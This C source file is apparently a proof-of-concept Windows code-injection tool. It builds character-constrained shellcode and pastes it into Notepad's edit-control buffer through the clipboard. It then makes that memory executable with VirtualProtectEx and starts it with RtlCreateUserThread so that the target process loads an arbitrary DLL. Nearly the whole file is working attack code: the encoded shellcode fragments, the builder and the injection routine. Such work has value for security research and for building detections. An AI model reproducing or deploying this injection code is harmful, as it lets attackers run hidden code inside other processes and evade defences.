/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <inttypes.h>

#include <windows.h>
#pragma comment(lib, "user32.lib")

typedef union _w64_t {
    uint8_t  b[8];
    uint16_t h[4];
    uint32_t w[2];
    uint64_t q;
    void *p;
} w64_t;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
    IN  HANDLE ProcessHandle,
    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN  BOOLEAN CreateSuspended,
    IN  ULONG StackZeroBits,
    IN  OUT  PULONG StackReserved,
    IN  OUT  PULONG StackCommit,
    IN  PVOID StartAddress,
    IN  PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientID);
    
// Initialize RBP for writing
#define EM_INIT_SIZE 4

char EM_INIT[] = {
  /* 0000 */ "\xc8\x00\x01\x00"     /* enter 0x100, 0        */
};

// Allocate 64-bit buffer on stack and place address in RDI for writing
#define STORE_ADR_INIT_SIZE 10

char STORE_ADR_INIT[] = {
  /* 0000 */ "\x6a\x00"             /* push 0                */
  /* 0002 */ "\x54"                 /* push rsp              */
  /* 0003 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0006 */ "\x5f"                 /* pop  rdi              */
  /* 0007 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
};

// Load an 8-Bit immediate value into AH
#define LOAD_BYTE_SIZE 5

char LOAD_BYTE[] = {
  /* 0000 */ "\xb8\x00\xff\x00\x4d" /* mov   eax, 0x4d00ff00 */
};

// Subtract 32 from AH
#define SUB_BYTE_SIZE 8

char SUB_BYTE[] = {
  /* 0000 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0003 */ "\x2d\x00\x20\x00\x4d" /* sub   eax, 0x4d002000 */
};

// Store AH in buffer and advance RDI by 1
#define STORE_BYTE_SIZE 9

char STORE_BYTE[] = {
  /* 0000 */ "\x00\x27"             /* add   byte [rdi], ah  */
  /* 0002 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
  /* 0005 */ "\xae"                 /* scasb                 */
  /* 0006 */ "\x00\x4d\x00"         /* add   byte [rbp], cl  */
};

// Load the address of DLL into RCX and RDI
#define LOAD_DLL_SIZE 12

char LOAD_DLL[] = {
  /* 0000 */ "\x59"                 /* pop  rcx              */
  /* 0001 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0004 */ "\x51"                 /* push rcx              */
  /* 0005 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
  /* 0008 */ "\x5f"                 /* pop  rdi              */
  /* 0009 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
};

// Increment RDI
#define INC_RDI_SIZE 4

char INC_RDI[] = {
  /* 0000 */ "\xae"                 /* scasb                 */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
};

// Store two null bytes
#define STORE_NULL_SIZE 8

char STORE_NULL[] = {
  /* 0000 */ "\xaa"                 /* stosb                 */
  /* 0001 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
  /* 0004 */ "\xaa"                 /* stosb                 */
  /* 0005 */ "\x00\x4d\x00"         /* add   byte [ebp], cl  */
};

#define EM_END_SIZE 2

char EM_END[] = {
  /* 0000 */ "\xc3"                 /* ret                   */
  /* 0001 */ "\x00"                 /* required for DLL      */
};

// only useful for CP_ACP codepage
int is_allowed(int ch) {
    if(ch >= 0x80 && ch <= 0x8C) return 0;
    if(ch >= 0x91 && ch <= 0x9C) return 0;
    return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
}

int store_addr(const char *s, void *out, w64_t *addr, int dll_len) {
    int     i;
    uint8_t *ptr = (uint8_t*)out;
    
    printf("Storing address of %s : %p\n", s, addr->p);
        
    // initialize new address
    memcpy(ptr, STORE_ADR_INIT, STORE_ADR_INIT_SIZE);
    ptr += STORE_ADR_INIT_SIZE;
    
    // for six bytes of a 48-Bit address
    for(i=0; i<6; i++) {
      // load a byte
      memcpy(ptr, LOAD_BYTE, LOAD_BYTE_SIZE);
      ptr[2] = addr->b[i];
    
      // if not allowed for CP_ACP, add 32
      if(!is_allowed(ptr[2])) {
        printf("0x%02x is being updated.\n", ptr[2]);
        ptr[2] += 32;
        // subtract 32 from byte at runtime
        memcpy(&ptr[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
        ptr += SUB_BYTE_SIZE;
      }
      ptr += LOAD_BYTE_SIZE;
      memcpy(ptr, STORE_BYTE, STORE_BYTE_SIZE);
      ptr += STORE_BYTE_SIZE;
    }
    // pop address into RCX and RDI?
    if(dll_len != 0) {
      memcpy(ptr, LOAD_DLL, LOAD_DLL_SIZE);
      ptr += LOAD_DLL_SIZE;
      for(i=0; i<dll_len*2; i++) {
        memcpy(ptr, INC_RDI, INC_RDI_SIZE);
        ptr += INC_RDI_SIZE;
      }
      memcpy(ptr, STORE_NULL, STORE_NULL_SIZE);
      ptr += STORE_NULL_SIZE;
    }
    // return length of code added
    return (int)(ptr - (uint8_t*)out); 
}

// return the amount of code required to load an address
int get_addr_len(w64_t *addr, int dll_len) {
    int i, len=STORE_ADR_INIT_SIZE;
    
    // pop address into RCX and RDI?
    if(dll_len != 0) {
      len += LOAD_DLL_SIZE + STORE_NULL_SIZE;
      len += ((dll_len * 2) * INC_RDI_SIZE);
    }
    // for a 48-bit address
    for(i=0; i<6; i++) {
      // if byte is not allowed
      if(!is_allowed(addr->b[i])) {
        // add length for sub byte
        len += SUB_BYTE_SIZE;
      }
      // add length for load + store
      len += LOAD_BYTE_SIZE;
      len += STORE_BYTE_SIZE;
    }
    return len;
}

void *build_shellcode(w64_t *emaddr, int dll_len, int *outlen) 
{
    int     unilen, cslen, padlen;
    uint8_t *uni, *cs;
    w64_t   loadlib, rtlexit, dlladdr;
    HMODULE m;
    
    // resolve address of exit API    
    m = GetModuleHandle("ntdll");
    rtlexit.p = (void*)GetProcAddress(m, "RtlExitUserThread");
    
    // resolve address of load API
    m = GetModuleHandle("kernel32");    
    loadlib.p = (void*)GetProcAddress(m, "LoadLibraryW");
    
    // calculate the length of buffer required
    unilen = EM_INIT_SIZE + EM_END_SIZE;
    unilen += get_addr_len(&rtlexit, 0);
    unilen += get_addr_len(&loadlib, 0);
    
    // For the offset of DLL path, we allow the maximum size
    // of code, and if required, simply pad out the remainder 
    // of buffer at the end.
    //
    // We could just do that for all the addresses, but I'm trying
    // to minimize the final size just a bit.
    unilen += (STORE_ADR_INIT_SIZE + 
      LOAD_DLL_SIZE + (2*dll_len * INC_RDI_SIZE) + STORE_NULL_SIZE +
      (6 * (LOAD_BYTE_SIZE + SUB_BYTE_SIZE + STORE_BYTE_SIZE)));
    
    // align up by 2 bytes
    unilen = (unilen + 1) & -2;
    
    printf("Allocating %" PRId32 " bytes of memory for shellcode.\n", unilen);
    cs = uni = (uint8_t*)calloc(sizeof(wchar_t), unilen);
    if(uni == NULL) { 
      printf("calloc(%i) failed.\n", unilen); 
      return NULL;
    }
    
    // store initialization code
    memcpy(cs, EM_INIT, EM_INIT_SIZE);
    cs += EM_INIT_SIZE;
    
    // store address of API to invoke
    cs += store_addr("RtlExitUserThread", cs, &rtlexit, 0);
    cs += store_addr("LoadLibraryW", cs, &loadlib, 0);
    
    // store address of DLL path
    dlladdr.q = (emaddr->q + unilen);
    cs += store_addr("DLL path", cs, &dlladdr, dll_len);
    
    // store end code
    memcpy(cs, EM_END, EM_END_SIZE);
    cs += EM_END_SIZE;
    
    // pad the buffer
    cslen = (int)(cs - uni);
    padlen = unilen - cslen;
    
    printf("Padding required  : %" PRId32 "\n", padlen);
    
    while(padlen--) {
      *cs++ = 0x4D; *cs++ = 0x00;
    }
    // show what we have 
    printf("\n\n");
    printf("Buffer Size       : %" PRId32 "\n", unilen);
    printf("Code Size         : %" PRId32 "\n", cslen);
    printf("EM Buffer         : %p\n", emaddr->p);
    printf("RtlExitUserThread : %p\n", rtlexit.p);
    printf("LoadLibraryW      : %p\n", loadlib.p);
    printf("DLL Offset        : %" PRIx64 "\n", dlladdr.q - emaddr->q);
    
    *outlen = unilen;
    return uni;
}

BOOL CopyData(UINT format, void *data, int cch) {
    LPTSTR  lptstrCopy; 
    HGLOBAL hglbCopy;
    
    if(OpenClipboard(NULL)) {
      EmptyClipboard();
      
      hglbCopy = GlobalAlloc(GMEM_MOVEABLE | GMEM_ZEROINIT, (cch + 2)); 
      lptstrCopy = GlobalLock(hglbCopy); 
      
      CopyMemory(lptstrCopy, data, cch); 
      GlobalUnlock(hglbCopy);
      SetClipboardData(format, hglbCopy);
        
      CloseClipboard();
      GlobalFree(hglbCopy);
    }
    return TRUE;
}

int main(int argc, char *argv[]) {
    int                   c, i, dll_len, asc_len, cs_len;
    uint8_t               *emh, *cs, *asc, buf[4096];
    DWORD                 pid, old;
    SIZE_T                rd;
    HWND                  hw;
    CLIENT_ID             cid;
    HANDLE                ht, hp;
    RtlCreateUserThread_t rtlcreate;
    w64_t                 embuf;
    HMODULE               m;
    PCHAR                 dll_path;
    
    if(argc != 2) {
      printf("usage: em_inject <DLL path>\n");
      return 0;
    }
    
    dll_path = argv[1];
    dll_len  = (int)strlen(argv[1]);

    // find parent window for notepad.exe
    hw = FindWindow(NULL, "Untitled - Notepad");
    if(hw == NULL) {
      printf("Unable to find notepad's parent window.\n");
      return 0;
    }
    
    // obtain the handle for the edit control
    hw = FindWindowEx(hw, NULL, "Edit", NULL);
    if(hw == NULL) {
      printf("Unable to find multiline edit control.\n");
      return 0;
    }
    
    // try to force reallocation of the EM buffer
    memset(buf, 0x4D, sizeof(buf));
    CopyData(CF_TEXT, buf, 4096);
    SendMessage(hw, WM_PASTE, 0, 0);
    
    // get the process id and open
    GetWindowThreadProcessId(hw, &pid);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // read the memory handle and buffer
    emh = (void*)SendMessage(hw, EM_GETHANDLE, 0, 0);
    ReadProcessMemory(hp, emh, &embuf.p, sizeof(ULONG_PTR), &rd);
    
    // otherwise, change 1 page to RWX
    VirtualProtectEx(hp, embuf.p, 4096, PAGE_EXECUTE_READWRITE, &old);
    
    // build the shellcode
    cs = build_shellcode(&embuf, dll_len, &cs_len);
    
    // convert to ASCII
    asc_len = (cs_len/2) + dll_len + 1;
    asc = calloc(sizeof(char), asc_len);
    
    for(i=0; i<cs_len; i+=2) asc[i/2] = cs[i];
    
    // copy the DLL path
    strcat((char*)asc, dll_path);
    
    // clear the contents of buffer
    SendMessage(hw, EM_SETSEL, 0, -1);
    SendMessage(hw, WM_CLEAR, 0, 0);
    
    // copy code to remote processs via clipboard
    CopyData(CF_TEXT, asc, asc_len + 1);
    SendMessage(hw, WM_PASTE, 0, 0);

    printf("\nCreate thread for remote code? [Y/N]:");
    
    // create thread?
    c = getchar();
    if(tolower(c) == 'y') {
      m = GetModuleHandle("ntdll");
      rtlcreate = (RtlCreateUserThread_t)GetProcAddress(m, "RtlCreateUserThread");
      
      rtlcreate(hp, NULL, FALSE, 0, NULL, 
        NULL, embuf.p, NULL, &ht, &cid);
    }
    free(cs);
    free(asc);
    CloseHandle(hp);
    return 0;
}
